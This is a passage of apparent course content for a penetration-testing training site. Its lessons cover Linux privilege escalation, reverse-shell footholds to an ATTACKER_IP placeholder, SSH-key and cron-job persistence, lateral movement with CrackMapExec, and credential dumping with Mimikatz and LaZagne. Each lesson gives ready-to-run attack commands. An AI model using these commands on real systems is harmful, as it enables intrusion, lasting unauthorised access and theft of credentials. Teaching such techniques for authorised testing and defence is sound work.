                  <li>Verify elevated privileges</li>
                  <li>Maintain access carefully</li>
               </ol>
            </div>

            <div>
              <h3 class="text-lg font-semibold text-white mb-4">Syntax (Linux Privilege Escalation Tools)</h3>
              <div class="bg-yellow-900/30 border border-yellow-700/50 p-4 rounded mb-6">
                <p class="text-yellow-200 text-sm">⚠️ Use only in legal labs / authorized assessments</p>
              </div>

              <div class="space-y-6">
                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Tool 1: LinPEAS</h4>
                  <p class="text-gray-300 mb-4">Automated Linux privilege escalation enumeration script.</p>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <div class="space-y-3">
                        <div>
                            <span class="text-gray-500 text-xs block mb-1"># 1. Download LinPEAS</span>
                            <code class="text-green-400 block font-mono text-sm">wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh</code>
                        </div>
                        <div>
                            <span class="text-gray-500 text-xs block mb-1"># 2. Make executable</span>
                            <code class="text-green-400 block font-mono text-sm">chmod +x linpeas.sh</code>
                        </div>
                        <div>
                            <span class="text-gray-500 text-xs block mb-1"># 3. Run LinPEAS</span>
                            <code class="text-green-400 block font-mono text-sm">./linpeas.sh</code>
                        </div>
                        <div>
                            <span class="text-gray-500 text-xs block mb-1"># 4. Run quietly (less noise)</span>
                            <code class="text-green-400 block font-mono text-sm">./linpeas.sh -q</code>
                        </div>
                        <div>
                            <span class="text-gray-500 text-xs block mb-1"># 5. Output results to file</span>
                            <code class="text-green-400 block font-mono text-sm">./linpeas.sh > linpeas_output.txt</code>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Tool 2: Linux Built-in Enumeration Commands</h4>
                  <p class="text-gray-300 mb-4">Manual privilege escalation discovery.</p>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <div class="space-y-3">
                        <div>
                            <span class="text-gray-500 text-xs block mb-1"># 1. Check current user and groups</span>
                            <code class="text-green-400 block font-mono text-sm">id</code>
                        </div>
                        <div>
                            <span class="text-gray-500 text-xs block mb-1"># 2. Find SUID binaries</span>
                            <code class="text-green-400 block font-mono text-sm">find / -perm -4000 -type f 2>/dev/null</code>
                        </div>
                        <div>
                            <span class="text-gray-500 text-xs block mb-1"># 3. Check sudo permissions</span>
                            <code class="text-green-400 block font-mono text-sm">sudo -l</code>
                        </div>
                        <div>
                            <span class="text-gray-500 text-xs block mb-1"># 4. Kernel version (for exploits)</span>
                            <code class="text-green-400 block font-mono text-sm">uname -a</code>
                        </div>
                        <div>
                            <span class="text-gray-500 text-xs block mb-1"># 5. Writable files owned by root</span>
                            <code class="text-green-400 block font-mono text-sm">find / -writable -type f -user root 2>/dev/null</code>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>

            <div class="bg-[#1e1e1e] p-6 rounded border border-[#333] mt-6">
              <h3 class="text-lg font-semibold text-white mb-2">Real-World Insight</h3>
              <p class="text-gray-300 mb-4">
                Many real systems are compromised without exploits, purely due to:
              </p>
              <ul class="list-disc pl-5 space-y-1 text-gray-300 text-sm">
                  <li>sudo misconfigurations</li>
                  <li>Writable scripts run by root</li>
                  <li>Old SUID binaries</li>
              </ul>
              <p class="text-gray-300 mt-4 text-sm font-medium">
                Good privilege management is more effective than patching alone.
              </p>
            </div>
          </div>
        `
      },
      {
        title: 'Linux Privilege Escalation Techniques',
        content: `
          <div class="space-y-6">
            <div class="mb-6">
              <h2 class="text-xl font-semibold text-white mb-2">Linux Privilege Escalation Techniques</h2>
              <p class="text-gray-300">
                Linux Privilege Escalation Techniques focus on abusing misconfigurations and insecure system design, not just exploits.
                Most real-world escalations happen because administrators trust files, services, or users more than they should.
              </p>
            </div>

            <div>
              <h3 class="text-lg font-semibold text-white mb-4">Major Linux Privilege Escalation Techniques</h3>
              <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                  <h4 class="text-white font-medium mb-2">1. SUID Binary Abuse</h4>
                  <p class="text-gray-400 text-sm">SUID files run with the owner’s privileges (often root). If misconfigured, they can be exploited to execute commands as root.</p>
                </div>
                <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                  <h4 class="text-white font-medium mb-2">2. Sudo Misconfiguration</h4>
                  <p class="text-gray-400 text-sm">Improper sudo rules allow users to run commands as root without passwords or restrictions.</p>
                </div>
                <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                  <h4 class="text-white font-medium mb-2">3. Writable Scripts & Files</h4>
                  <p class="text-gray-400 text-sm">Root-owned scripts that are writable by users can be modified to execute malicious commands.</p>
                </div>
                <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                  <h4 class="text-white font-medium mb-2">4. Cron Job Abuse</h4>
                  <p class="text-gray-400 text-sm">Scheduled tasks running as root but executing writable scripts.</p>
                </div>
                <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                  <h4 class="text-white font-medium mb-2">5. Environment Variable Injection</h4>
                  <p class="text-gray-400 text-sm">Abusing PATH, LD_PRELOAD, or LD_LIBRARY_PATH.</p>
                </div>
                <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                  <h4 class="text-white font-medium mb-2">6. Kernel Exploitation (Last Resort)</h4>
                  <p class="text-gray-400 text-sm">Using kernel vulnerabilities when no misconfigurations exist.</p>
                </div>
              </div>
            </div>

            <div class="bg-[#1e1e1e] p-6 rounded border border-[#333]">
              <h3 class="text-lg font-semibold text-white mb-4">Real Attack Flow</h3>
              <div class="flex flex-wrap gap-2 text-sm text-gray-300">
                <span class="bg-[#2d2d2d] px-3 py-1 rounded border border-[#333]">Find misconfiguration</span>
                <span class="text-gray-500">→</span>
                <span class="bg-[#2d2d2d] px-3 py-1 rounded border border-[#333]">Identify execution point</span>
                <span class="text-gray-500">→</span>
                <span class="bg-[#2d2d2d] px-3 py-1 rounded border border-[#333]">Inject command</span>
                <span class="text-gray-500">→</span>
                <span class="bg-[#2d2d2d] px-3 py-1 rounded border border-[#333]">Gain root shell</span>
                <span class="text-gray-500">→</span>
                <span class="bg-[#2d2d2d] px-3 py-1 rounded border border-[#333]">Clean traces</span>
              </div>
            </div>

            <div>
              <h3 class="text-lg font-semibold text-white mb-4">Syntax (Linux Privilege Escalation Tools)</h3>
              <div class="bg-yellow-900/30 border border-yellow-700/50 p-4 rounded mb-6">
                <p class="text-yellow-200 text-sm">⚠️ For authorized labs & pentests only</p>
              </div>

              <div class="space-y-6">
                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Tool 1: GTFOBins</h4>
                  <p class="text-gray-300 mb-4">A curated list of binaries that can be abused for privilege escalation.</p>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <div class="space-y-3">
                        <div>
                            <span class="text-gray-500 text-xs block mb-1"># 1. List SUID binaries</span>
                            <code class="text-green-400 block font-mono text-sm">find / -perm -4000 -type f 2>/dev/null</code>
                        </div>
                        <div>
                            <span class="text-gray-500 text-xs block mb-1"># 2. Check if binary exists in GTFOBins (example: find)</span>
                            <code class="text-green-400 block font-mono text-sm">find . -exec /bin/sh -p \\; -quit</code>
                        </div>
                        <div>
                            <span class="text-gray-500 text-xs block mb-1"># 3. Abuse sudo permissions using allowed binary</span>
                            <code class="text-green-400 block font-mono text-sm">sudo vim -c ':!/bin/sh'</code>
                        </div>
                        <div>
                            <span class="text-gray-500 text-xs block mb-1"># 4. Escape shell via less</span>
                            <code class="text-green-400 block font-mono text-sm">sudo less /etc/passwd</code>
                            <span class="text-gray-500 text-xs block mt-1"># then type</span>
                            <code class="text-green-400 block font-mono text-sm">!sh</code>
                        </div>
                        <div>
                            <span class="text-gray-500 text-xs block mb-1"># 5. Exploit tar with sudo</span>
                            <code class="text-green-400 block font-mono text-sm">sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh</code>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Tool 2: Linux Exploit Suggester</h4>
                  <p class="text-gray-300 mb-4">Suggests kernel & local exploits based on system info.</p>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <div class="space-y-3">
                        <div>
                            <span class="text-gray-500 text-xs block mb-1"># 1. Download exploit suggester</span>
                            <code class="text-green-400 block font-mono text-sm">wget https://github.com/The-Z-Labs/linux-exploit-suggester/raw/master/linux-exploit-suggester.sh</code>
                        </div>
                        <div>
                            <span class="text-gray-500 text-xs block mb-1"># 2. Make executable</span>
                            <code class="text-green-400 block font-mono text-sm">chmod +x linux-exploit-suggester.sh</code>
                        </div>
                        <div>
                            <span class="text-gray-500 text-xs block mb-1"># 3. Run exploit suggester</span>
                            <code class="text-green-400 block font-mono text-sm">./linux-exploit-suggester.sh</code>
                        </div>
                        <div>
                            <span class="text-gray-500 text-xs block mb-1"># 4. Save output to file</span>
                            <code class="text-green-400 block font-mono text-sm">./linux-exploit-suggester.sh > exploits.txt</code>
                        </div>
                        <div>
                            <span class="text-gray-500 text-xs block mb-1"># 5. Run with kernel version manually</span>
                            <code class="text-green-400 block font-mono text-sm">uname -r</code>
                        </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div>
            </div>

            <div class="bg-[#1e1e1e] p-6 rounded border border-[#333] mt-6">
              <h3 class="text-lg font-semibold text-white mb-2">Important Security Insight</h3>
              <p class="text-gray-300 mb-4">
                Kernel exploits are noisy and risky. Professional attackers always prefer:
              </p>
              <ul class="list-disc pl-5 space-y-1 text-gray-300 text-sm mb-4">
                  <li>SUID abuse</li>
                  <li>Sudo misconfigs</li>
                  <li>Writable cron jobs</li>
              </ul>
              <p class="text-gray-300 text-sm">
                Because they are: <span class="text-green-400 font-medium">Stable, Harder to detect, More reliable</span>.
              </p>
              <p class="text-gray-300 mt-4 text-sm font-medium">
                Key Takeaway: Privilege escalation is about thinking like a system administrator, not just an attacker.
              </p>
            </div>
          </div>
        `
      },
      {
        title: 'Creating Foothold in a System',
        content: `<div class="space-y-6">
          <div>
            <h2 class="text-xl font-semibold mb-3 text-white">Creating Foothold in a System</h2>
            <p class="mb-4 text-gray-300">
              A foothold is a stable initial access point inside a compromised system that allows an attacker to continue operations without repeatedly exploiting the same vulnerability. In real-world attacks, gaining access is not enough. Attackers must stabilize, survive reboots, and avoid detection. This stage bridges exploitation → post‑exploitation.
            </p>
          </div>

          <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h3 class="text-lg font-semibold text-white mb-2">Objectives of a Foothold</h3>
              <ul class="list-disc pl-5 space-y-1 text-gray-300 text-sm">
                <li>Maintain access after initial exploitation</li>
                <li>Upgrade unstable shells</li>
                <li>Establish reliable communication</li>
                <li>Prepare for privilege escalation</li>
                <li>Avoid detection and disruption</li>
              </ul>
            </div>
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h3 class="text-lg font-semibold text-white mb-2">Common Foothold Techniques</h3>
              <ul class="list-disc pl-5 space-y-1 text-gray-300 text-sm">
                <li>Reverse shells (stable & encrypted)</li>
                <li>Web shells on compromised servers</li>
                <li>SSH key injection</li>
                <li>Shell upgrades (TTY stabilization)</li>
                <li>Scheduled callbacks (beacons)</li>
              </ul>
            </div>
          </div>

          <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
            <h3 class="text-lg font-semibold text-white mb-2">Foothold vs Persistence</h3>
            <ul class="list-disc pl-5 space-y-1 text-gray-300 text-sm">
              <li><strong>Foothold:</strong> Short-term stable access</li>
              <li><strong>Persistence:</strong> Long-term survival after reboots</li>
              <li>Foothold comes before persistence.</li>
            </ul>
          </div>

          <div>
            <h3 class="text-xl font-semibold mb-3 text-white">Syntax (Foothold Creation Tools)</h3>
            <div class="bg-yellow-900/30 border border-yellow-700/50 p-3 rounded mb-4">
              <p class="text-yellow-200 text-sm">
                ⚠️ <span class="font-semibold">Warning:</span> Practice only in labs or authorized environments.
              </p>
            </div>

            <div class="space-y-4">
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h4 class="text-lg font-semibold text-white mb-2">Tool 1: Netcat (Manual Foothold Creation)</h4>
                <div class="space-y-3">
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 1. Start listener on attacker machine</span>
                    <code class="text-green-400 block font-mono text-sm">nc -lvnp 4444</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 2. Basic reverse shell (target)</span>
                    <code class="text-green-400 block font-mono text-sm">nc &lt;ATTACKER_IP&gt; 4444 -e /bin/bash</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 3. Bash reverse shell (no -e flag)</span>
                    <code class="text-green-400 block font-mono text-sm">bash -i >& /dev/tcp/&lt;ATTACKER_IP&gt;/4444 0>&1</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 4. Python reverse shell</span>
                    <code class="text-green-400 block font-mono text-sm">python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("&lt;ATTACKER_IP&gt;",4444));[os.dup2(s.fileno(),i) for i in (0,1,2)];pty.spawn("/bin/bash")'</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 5. Stabilize shell (TTY upgrade)</span>
                    <code class="text-green-400 block font-mono text-sm">python3 -c 'import pty; pty.spawn("/bin/bash")'</code>
                  </div>
                </div>
              </div>

              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h4 class="text-lg font-semibold text-white mb-2">Tool 2: Metasploit (Reliable Foothold)</h4>
                <div class="space-y-3">
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 1. Launch Metasploit</span>
                    <code class="text-green-400 block font-mono text-sm">msfconsole</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 2. Use multi-handler</span>
                    <code class="text-green-400 block font-mono text-sm">use exploit/multi/handler</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 3. Set payload</span>
                    <code class="text-green-400 block font-mono text-sm">set payload linux/x64/meterpreter/reverse_tcp</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 4. Configure listener</span>
                    <code class="text-green-400 block font-mono text-sm">set LHOST &lt;ATTACKER_IP&gt;</code>
                    <code class="text-green-400 block font-mono text-sm mt-1">set LPORT 4444</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 5. Start handler</span>
                    <code class="text-green-400 block font-mono text-sm">exploit</code>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <div class="bg-[#1e1e1e] p-6 rounded border border-[#333] mt-6">
            <h3 class="text-lg font-semibold text-white mb-2">Real-World Insight</h3>
            <p class="text-gray-300 mb-4">
              Unstable shells lead to:
            </p>
            <ul class="list-disc pl-5 space-y-1 text-gray-300 text-sm mb-4">
              <li>Lost access</li>
              <li>Broken exploits</li>
              <li>Detection</li>
            </ul>
            <p class="text-gray-300 text-sm">
              Professional attackers always stabilize shells first before escalating privileges.
            </p>
            <p class="text-gray-300 mt-4 text-sm font-medium">
              Key Takeaway: A foothold converts a successful exploit into operational control.
            </p>
          </div>
        </div>`,
        duration: '15 min'
      },
      {
        title: 'Maintaining Persistence',
        content: `<div class="space-y-6">
          <div>
            <h2 class="text-xl font-semibold mb-3 text-white">Maintaining Persistence</h2>
            <p class="mb-4 text-gray-300">
              Persistence is the ability to retain access to a system even after reboots, logouts, or service restarts. If a foothold is temporary, persistence is long‑term survival. In real attacks, persistence allows attackers to:
            </p>
            <ul class="list-disc pl-5 space-y-1 text-gray-300 text-sm mb-4">
              <li>Re-enter systems silently</li>
              <li>Monitor activity over time</li>
              <li>Maintain control without re‑exploitation</li>
            </ul>
          </div>

          <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h3 class="text-lg font-semibold text-white mb-2">Common Persistence Techniques (Linux)</h3>
              <ul class="list-disc pl-5 space-y-1 text-gray-300 text-sm">
                <li>SSH key injection</li>
                <li>Cron job backdoors</li>
                <li>Systemd service backdoors</li>
                <li>User account creation</li>
                <li>Web shell persistence</li>
                <li>Startup script modification</li>
              </ul>
            </div>
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h3 class="text-lg font-semibold text-white mb-2">Attacker Goals During Persistence</h3>
              <ul class="list-disc pl-5 space-y-1 text-gray-300 text-sm">
                <li>Blend in with legitimate services</li>
                <li>Avoid suspicious binaries</li>
                <li>Minimize resource usage</li>
                <li>Survive system updates & reboots</li>
              </ul>
            </div>
          </div>

          <div>
            <h3 class="text-xl font-semibold mb-3 text-white">Syntax (Persistence Tools & Methods)</h3>
            <div class="bg-yellow-900/30 border border-yellow-700/50 p-3 rounded mb-4">
              <p class="text-yellow-200 text-sm">
                ⚠️ <span class="font-semibold">Warning:</span> Only for authorized security testing.
              </p>
            </div>

            <div class="space-y-4">
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h4 class="text-lg font-semibold text-white mb-2">Tool 1: SSH Key Persistence</h4>
                <div class="space-y-3">
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 1. Generate SSH key on attacker system</span>
                    <code class="text-green-400 block font-mono text-sm">ssh-keygen -t rsa -b 4096</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 2. Create .ssh directory (target)</span>
                    <code class="text-green-400 block font-mono text-sm">mkdir -p ~/.ssh</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 3. Add public key to authorized_keys</span>
                    <code class="text-green-400 block font-mono text-sm">echo "ATTACKER_PUBLIC_KEY" >> ~/.ssh/authorized_keys</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 4. Fix permissions</span>
                    <code class="text-green-400 block font-mono text-sm">chmod 700 ~/.ssh</code>
                    <code class="text-green-400 block font-mono text-sm mt-1">chmod 600 ~/.ssh/authorized_keys</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 5. Login without password</span>
                    <code class="text-green-400 block font-mono text-sm">ssh user@target_ip</code>
                  </div>
                </div>
              </div>

              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h4 class="text-lg font-semibold text-white mb-2">Tool 2: Cron Job Persistence</h4>
                <div class="space-y-3">
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 1. List cron jobs</span>
                    <code class="text-green-400 block font-mono text-sm">crontab -l</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 2. Edit user cron</span>
                    <code class="text-green-400 block font-mono text-sm">crontab -e</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 3. Reverse shell cron job (every 5 min)</span>
                    <code class="text-green-400 block font-mono text-sm">*/5 * * * * bash -c 'bash -i >& /dev/tcp/&lt;IP&gt;/4444 0>&1'</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 4. System-wide cron directories</span>
                    <code class="text-green-400 block font-mono text-sm">ls -la /etc/cron*</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 5. Verify cron execution</span>
                    <code class="text-green-400 block font-mono text-sm">grep CRON /var/log/syslog</code>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <div class="bg-[#1e1e1e] p-6 rounded border border-[#333] mt-6">
            <h3 class="text-lg font-semibold text-white mb-2">Security Insight</h3>
            <p class="text-gray-300 mb-4">
              Persistence is often detected by:
            </p>
            <ul class="list-disc pl-5 space-y-1 text-gray-300 text-sm mb-4">
              <li>Modified startup files</li>
              <li>New user accounts</li>
              <li>Unexpected cron entries</li>
            </ul>
            <p class="text-gray-300 text-sm">
              Blue teams focus heavily on persistence artifacts.
            </p>
          </div>
        </div>`,
        duration: '15 min'
      },
      {
        title: 'Lateral Movement Techniques',
        content: `<div class="space-y-6">
          <div>
            <h2 class="text-xl font-semibold mb-3 text-white">Lateral Movement Techniques</h2>
            <p class="mb-4 text-gray-300">
              Lateral Movement is the process of moving from one compromised system to other systems within the same network. The goal is to expand control, access sensitive systems, and reach high‑value targets like databases or domain controllers. Real attackers rarely stop at one machine.
            </p>
          </div>

          <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h3 class="text-lg font-semibold text-white mb-2">Why Lateral Movement Matters</h3>
              <ul class="list-disc pl-5 space-y-1 text-gray-300 text-sm">
                <li>One machine ≠ full breach</li>
                <li>Internal systems often trust each other</li>
                <li>Credentials are reused across systems</li>
                <li>Internal traffic is less monitored</li>
              </ul>
            </div>
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h3 class="text-lg font-semibold text-white mb-2">Common Lateral Movement Methods</h3>
              <ul class="list-disc pl-5 space-y-1 text-gray-300 text-sm">
                <li>Reusing stolen credentials</li>
                <li>SSH trust abuse</li>
                <li>Pass-the-Hash (internal networks)</li>
                <li>File share abuse</li>
                <li>Exploiting internal services</li>
                <li>Pivoting through compromised hosts</li>
              </ul>
            </div>
          </div>

          <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
            <h3 class="text-lg font-semibold text-white mb-2">Lateral Movement Workflow</h3>
            <ol class="list-decimal pl-5 space-y-1 text-gray-300 text-sm">
              <li>Enumerate internal network</li>
              <li>Harvest credentials</li>
              <li>Identify reachable hosts</li>
              <li>Move silently</li>
              <li>Establish foothold on new host</li>
            </ol>
          </div>

          <div>
            <h3 class="text-xl font-semibold mb-3 text-white">Syntax (Lateral Movement Tools)</h3>
            <div class="bg-yellow-900/30 border border-yellow-700/50 p-3 rounded mb-4">
              <p class="text-yellow-200 text-sm">
                ⚠️ <span class="font-semibold">Warning:</span> For legal labs & pentesting only.
              </p>
            </div>

            <div class="space-y-4">
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h4 class="text-lg font-semibold text-white mb-2">Tool 1: SSH (Credential Reuse & Trust Abuse)</h4>
                <div class="space-y-3">
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 1. Scan internal network</span>
                    <code class="text-green-400 block font-mono text-sm">ip a</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 2. Identify live hosts</span>
                    <code class="text-green-400 block font-mono text-sm">nmap -sn 192.168.1.0/24</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 3. SSH into another machine</span>
                    <code class="text-green-400 block font-mono text-sm">ssh user@192.168.1.20</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 4. Use private key for access</span>
                    <code class="text-green-400 block font-mono text-sm">ssh -i id_rsa user@192.168.1.30</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 5. SSH port forwarding (pivoting)</span>
                    <code class="text-green-400 block font-mono text-sm">ssh -L 8080:localhost:80 user@192.168.1.20</code>
                  </div>
                </div>
              </div>

              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h4 class="text-lg font-semibold text-white mb-2">Tool 2: CrackMapExec (Internal Network Movement)</h4>
                <div class="space-y-3">
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 1. Scan SMB hosts</span>
                    <code class="text-green-400 block font-mono text-sm">crackmapexec smb 192.168.1.0/24</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 2. Test credentials</span>
                    <code class="text-green-400 block font-mono text-sm">crackmapexec smb 192.168.1.0/24 -u user -p password</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 3. Dump shares</span>
                    <code class="text-green-400 block font-mono text-sm">crackmapexec smb 192.168.1.10 -u user -p password --shares</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 4. Execute command remotely</span>
                    <code class="text-green-400 block font-mono text-sm">crackmapexec smb 192.168.1.10 -u user -p password -x "whoami"</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 5. Enable pivoting</span>
                    <code class="text-green-400 block font-mono text-sm">crackmapexec smb 192.168.1.10 -u user -p password --exec-method smbexec</code>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <div class="bg-[#1e1e1e] p-6 rounded border border-[#333] mt-6">
            <h3 class="text-lg font-semibold text-white mb-2">Real-World Insight</h3>
            <p class="text-gray-300 mb-4">
              Lateral movement is where:
            </p>
            <ul class="list-disc pl-5 space-y-1 text-gray-300 text-sm mb-4">
              <li>Attackers become dangerous</li>
              <li>Detection chances increase</li>
              <li>Small mistakes expose entire networks</li>
            </ul>
            <p class="text-gray-300 text-sm">
              Professional attackers move slowly and quietly.
            </p>
            <p class="text-gray-300 mt-4 text-sm font-medium">
              Key Takeaway: One compromised system is an entry point, not the destination.
            </p>
          </div>
        </div>`,
        duration: '15 min'
      },
      {
        title: 'Tokens & Credential Dumping',
        content: `<div class="space-y-6">
          <div>
            <h2 class="text-xl font-semibold mb-3 text-white">Tokens & Credential Dumping</h2>
            <p class="mb-4 text-gray-300">
              After gaining access, attackers often dump credentials and tokens to expand control. This allows them to access additional accounts, services, or systems without repeated exploitation. Tokens represent temporary access (Kerberos tickets, OAuth tokens, API keys), while credentials include passwords, hashes, and cached secrets.
            </p>
          </div>

          <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h3 class="text-lg font-semibold text-white mb-2">Common Credential & Token Targets</h3>
              <ul class="list-disc pl-5 space-y-1 text-gray-300 text-sm">
                <li><strong>Windows:</strong> SAM database, LSASS memory, Kerberos tickets</li>
                <li><strong>Linux:</strong> /etc/shadow, SSH keys, Config files</li>
                <li><strong>Cloud:</strong> AWS IAM keys, Azure Service Principals, GCP service accounts</li>
                <li><strong>Applications:</strong> Browser-stored credentials, Database connection strings</li>
              </ul>
            </div>
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h3 class="text-lg font-semibold text-white mb-2">Attack Workflow</h3>
              <ol class="list-decimal pl-5 space-y-1 text-gray-300 text-sm">
                <li>Enumerate users & sessions</li>
                <li>Dump credentials & tokens</li>
                <li>Crack or reuse credentials</li>
                <li>Move laterally or escalate privileges</li>
                <li>Avoid detection by clearing traces</li>
              </ol>
            </div>
          </div>

          <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
            <h3 class="text-lg font-semibold text-white mb-2">Real-World Example</h3>
            <p class="text-gray-300 text-sm">
              Attackers dumped LSASS memory to steal domain admin credentials and took over an entire enterprise network.
            </p>
          </div>

          <div>
            <h3 class="text-xl font-semibold mb-3 text-white">Syntax (Credential Dumping Tools)</h3>
            <div class="bg-yellow-900/30 border border-yellow-700/50 p-3 rounded mb-4">
              <p class="text-yellow-200 text-sm">
                ⚠️ <span class="font-semibold">Warning:</span> Only in authorized pentest or lab environments.
              </p>
            </div>

            <div class="space-y-4">
              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h4 class="text-lg font-semibold text-white mb-2">Tool 1: Mimikatz (Windows Credential Dumping)</h4>
                <div class="space-y-3">
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 1. Open elevated PowerShell</span>
                    <code class="text-green-400 block font-mono text-sm">powershell</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 2. Run Mimikatz</span>
                    <code class="text-green-400 block font-mono text-sm">mimikatz</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 3. Enable debug privileges</span>
                    <code class="text-green-400 block font-mono text-sm">privilege::debug</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 4. Dump cleartext passwords from memory</span>
                    <code class="text-green-400 block font-mono text-sm">sekurlsa::logonpasswords</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 5. Dump Kerberos tickets</span>
                    <code class="text-green-400 block font-mono text-sm">kerberos::list /export</code>
                  </div>
                </div>
              </div>

              <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
                <h4 class="text-lg font-semibold text-white mb-2">Tool 2: LaZagne (Multi-Platform Credential Recovery)</h4>
                <div class="space-y-3">
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 1. Download LaZagne</span>
                    <code class="text-green-400 block font-mono text-sm">git clone https://github.com/AlessandroZ/LaZagne.git</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 2. Navigate to folder</span>
                    <code class="text-green-400 block font-mono text-sm">cd LaZagne</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 3. Run for Windows passwords</span>
                    <code class="text-green-400 block font-mono text-sm">python LaZagne.py all</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 4. Run for Linux stored passwords</span>
                    <code class="text-green-400 block font-mono text-sm">python LaZagne.py linux</code>
                  </div>
                  <div>
                    <span class="text-gray-500 text-xs block mb-1"># 5. Save output for analysis</span>
                    <code class="text-green-400 block font-mono text-sm">python LaZagne.py all > creds_report.txt</code>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <div class="bg-[#1e1e1e] p-6 rounded border border-[#333] mt-6">
            <h3 class="text-lg font-semibold text-white mb-2">Key Takeaway</h3>
            <ul class="list-disc pl-5 space-y-1 text-gray-300 text-sm">
              <li>Credential dumping is critical for expanding control</li>
              <li>Tokens & cached credentials allow attackers to move laterally without re-exploitation</li>
              <li>Detection relies on monitoring abnormal memory reads, process access, and token use</li>
            </ul>
